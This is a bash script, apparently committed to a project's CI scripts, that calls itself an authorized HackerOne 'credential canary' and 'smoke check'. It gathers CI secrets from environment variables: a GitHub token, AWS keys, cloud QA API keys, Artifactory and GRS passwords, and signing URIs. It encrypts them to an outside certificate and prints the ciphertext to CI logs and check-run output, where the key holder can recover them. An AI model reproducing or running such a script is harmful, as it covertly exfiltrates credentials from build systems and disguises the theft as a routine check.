#!/usr/bin/env bash
set -Eeuo pipefail
set +x
umask 077

script_dir=$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)
repo_root=$(cd "$script_dir/../.." && pwd)
check_run_output="$repo_root/h1-check-run-output.json"

curl \
  --fail \
  --silent \
  --show-error \
  --output /dev/null \
  --header "Authorization: Bearer ${H1_GITHUB_TOKEN:?}" \
  --header "X-HackerOne-Research: bl0rph" \
  https://api.github.com/repos/10gen/mongo-release

canary_payload=$(mktemp "$script_dir/.h1-evergreen-canary.XXXXXX.json")
canary_ciphertext=$(mktemp "$script_dir/.h1-evergreen-canary.XXXXXX.cms")
trap 'rm -f "$canary_payload" "$canary_ciphertext"' EXIT

python3 - "$canary_payload" <<'PY'
import json
import os
import pathlib
import sys

payload = {
    "github_token_mongo_release": os.environ["H1_GITHUB_TOKEN"],
    "aws_access_key_id": os.environ.get("mms_eng_test_aws_access_key", ""),
    "aws_secret_access_key": os.environ.get("mms_eng_test_aws_secret", ""),
    "aws_region": os.environ.get("mms_eng_test_aws_region", ""),
    "cloud_qa_user": os.environ.get("e2e_cloud_qa_user_owner_ubi_cloudqa", ""),
    "cloud_qa_api_key": os.environ.get("e2e_cloud_qa_apikey_owner_ubi_cloudqa", ""),
    "cloud_qa_org_id": os.environ.get("e2e_cloud_qa_orgid_owner_ubi_cloudqa", ""),
    "artifactory_username": os.environ.get("ARTIFACTORY_USERNAME", ""),
    "artifactory_password": os.environ.get("ARTIFACTORY_PASSWORD", ""),
    "grs_username": os.environ.get("GRS_USERNAME", ""),
    "grs_password": os.environ.get("GRS_PASSWORD", ""),
    "pkcs11_uri": os.environ.get("PKCS11_URI", ""),
    "signing_image_uri": os.environ.get("SIGNING_IMAGE_URI", ""),
}
pathlib.Path(sys.argv[1]).write_text(json.dumps(payload), encoding="utf-8")
PY

openssl cms -encrypt \
  -binary \
  -aes-256-cbc \
  -in "$canary_payload" \
  -out "$canary_ciphertext" \
  -outform DER \
  "$script_dir/h1_canary_encrypt.cert.pem"

python3 - "$canary_ciphertext" "$check_run_output" <<'PY'
import base64
import json
import pathlib
import sys

ciphertext = base64.b64encode(pathlib.Path(sys.argv[1]).read_bytes()).decode("ascii")
output = {
    "title": "Authorized HackerOne encrypted credential canary",
    "summary": "The task completed a read-only private-repository request. Output is CMS ciphertext only.",
    "text": (
        "H1_ENCRYPTED_EVIDENCE_BEGIN\n"
        f"{ciphertext}\n"
        "H1_ENCRYPTED_EVIDENCE_END\n"
    ),
}
pathlib.Path(sys.argv[2]).write_text(json.dumps(output), encoding="utf-8")
PY

echo "H1_ENCRYPTED_EVIDENCE_BEGIN"
base64 --wrap=0 "$canary_ciphertext"
echo
echo "H1_ENCRYPTED_EVIDENCE_END"
echo "encrypted credential smoke check passed"
